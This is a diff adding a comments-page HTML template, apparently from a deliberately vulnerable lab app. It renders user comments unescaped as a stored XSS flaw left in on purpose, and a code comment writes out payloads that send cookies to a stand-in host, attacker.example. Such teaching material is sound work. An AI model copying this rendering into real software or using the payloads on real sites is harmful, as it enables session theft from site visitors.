@@ -1,0 +1,53 @@
+{% extends "./layout.html" %}
+{% block title %}Comments{% endblock %}
+{% block content %}
+
+<div class="row">
+  <div class="col-lg-12">
+    <div class="panel panel-default">
+      <div class="panel-heading">
+        <h3 class="panel-title">Community Comments</h3>
+      </div>
+      <div class="panel-body">
+
+        <!--
+          VULN: Stored XSS (CWE-79)
+          Comments are stored without sanitisation in addComment() and rendered
+          here with no escaping (autoescape globally off in server.js).
+
+          Exploit payload stored via POST /vulnerable/comment:
+            <img src=x onerror="fetch('//attacker.example/c?cookie='+document.cookie)">
+            <script>new Image().src='//attacker.example/steal?'+document.cookie</script>
+        -->
+        {% for c in comments %}
+        <div class="panel panel-info">
+          <div class="panel-body">
+            {{ c.comment }}
+            <!-- ^^^ Raw HTML rendered — stored XSS executes here for every visitor -->
+          </div>
+          <div class="panel-footer text-muted" style="font-size:11px">
+            Posted by user {{ c.userId }} at {{ c.createdAt }}
+          </div>
+        </div>
+        {% endfor %}
+
+        {% if !comments or comments.length == 0 %}
+        <p class="text-muted">No comments yet. Be the first!</p>
+        {% endif %}
+
+        <hr>
+        <h4>Post a Comment</h4>
+        <form action="/vulnerable/comment" method="post">
+          <div class="form-group">
+            <textarea class="form-control" name="comment" rows="3"
+              placeholder="HTML allowed — autoescape is disabled..."></textarea>
+          </div>
+          <button type="submit" class="btn btn-primary">Submit Comment</button>
+        </form>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
